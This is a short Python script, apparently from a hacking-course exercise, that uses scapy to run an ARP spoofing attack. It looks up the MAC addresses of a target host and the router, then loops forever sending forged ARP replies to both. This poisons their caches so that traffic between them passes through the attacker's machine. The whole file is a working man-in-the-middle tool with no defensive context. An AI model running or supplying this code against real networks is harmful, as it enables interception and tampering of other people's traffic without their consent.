import scapy.all as scapy
import optparse
import time
import sys

def getoptions():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target_ip",dest="target_ip",help="The target ip")
    # parser.add_option("-m","--target_mac",dest="target_mac",help="The mac address of target")
    parser.add_option("-r","--router_ip",dest="router_ip",help="the ip address of the router")
    (options, arguments) = parser.parse_args()
    (options,arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-]please enter target ip")
    elif not options.router_ip:
        parser.error("[-]please enter router ip")
    return options

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    answered = scapy.srp(arp_request_broadcast,timeout=10,verbose=False)[0]
    # print(answered.summary())
    return answered[0][1].hwsrc
    # print("IP \t\t\t MAC\n--------------------------------------------")
    # client_list[]
    # for element in answered:
    #     client_dict={"ip":element.ip,"mac":element.mac}
    #     client_list.append(client_dict)
    #     # print(element[1].psrc+ "\t\t" +element[1].hwsrc)
    #     # print("--------------------------------------------")
    # return client_list


def spoof(ip,target_mac,router_ip):
    packet=scapy.ARP(op=2, pdst=ip,hwdst=target_mac,psrc=router_ip)
    scapy.send(packet,verbose=False)


options = getoptions()
target_mac = scan(options.target_ip)
router_mac = scan(options.router_ip)
count = 0
try:
    while True:
        spoof(options.target_ip,target_mac,options.router_ip)
        spoof(options.router_ip,router_mac,options.target_ip)
        count += 2
        print("\r[+] packets sent: " + str(count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Application closed")
# print(packet.show())
# print(packet.summary())